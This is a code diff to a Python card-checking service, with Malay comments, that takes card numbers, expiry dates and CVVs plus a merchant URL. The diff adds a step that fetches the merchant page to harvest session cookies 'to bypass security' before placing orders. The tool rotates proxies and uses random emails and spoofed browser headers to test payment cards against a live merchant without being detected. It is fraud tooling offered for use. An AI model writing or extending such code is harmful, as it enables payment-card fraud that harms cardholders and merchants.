@@ -91,12 +91,11 @@ def _poll_status(session, order_id, token, ua, max_attempts=10, delay=3):
     return data
 
 def event_stream(card_num, mm, yy, cvv_code, merchant_url):
-    # Ambil proxy rawak untuk session ni
     proxies = get_random_proxy()
-    proxy_ip = proxies['http'].split('@')[-1] # Ambil IP je untuk log
+    proxy_ip = proxies['http'].split('@')[-1]
     
     session = requests.Session()
-    session.proxies = proxies # Set proxy ke dalam session
+    session.proxies = proxies
 
     try:
         email = _random_email()
@@ -106,11 +105,32 @@ def event_stream(card_num, mm, yy, cvv_code, merchant_url):
         if len(yy) == 2:
             yy = '20' + yy
 
-        # STEP 0: PROXY CONNECTION LOG
         yield f"data: {json.dumps({'type': 'log', 'msg': f'Routing traffic via Proxy -> {proxy_ip}', 'class': 'info'})}\n\n"
 
+        # STEP 0.5: GET PAGE UNTUK DAPAT COOKIE (PENAMBAHAN BARU)
+        yield f"data: {json.dumps({'type': 'log', 'msg': 'Accessing merchant page to bypass security (Cookies)...', 'class': 'info'})}\n\n"
+        
+        headers_init = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Linux"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': ua,
+        }
+        
+        # Pergi ke page utama dulu untuk simpan Cookie (csrf token, session, dll)
+        session.get(merchant_url, headers=headers_init, timeout=30)
+        yield f"data: {json.dumps({'type': 'log', 'msg': 'Session cookies harvested successfully.', 'class': 'success'})}\n\n"
+
         # STEP 1: MERCHANT REQUEST
-        yield f"data: {json.dumps({'type': 'log', 'msg': 'Initiating connection to Merchant API...', 'class': 'info'})}\n\n"
+        yield f"data: {json.dumps({'type': 'log', 'msg': 'Initiating order creation via Merchant API...', 'class': 'info'})}\n\n"
         
         headers1 = {
             'accept': 'application/json, text/javascript, */*; q=0.01',
@@ -354,7 +374,6 @@ def check_card(cc: str = Query(...), url: str = Query("https://beta3.centaurus.o
     if len(yy) == 2:
         yy = '20' + yy
         
-    # Pastikan URL ada slash di akhir
     if not url.endswith('/'):
         url += '/'
         
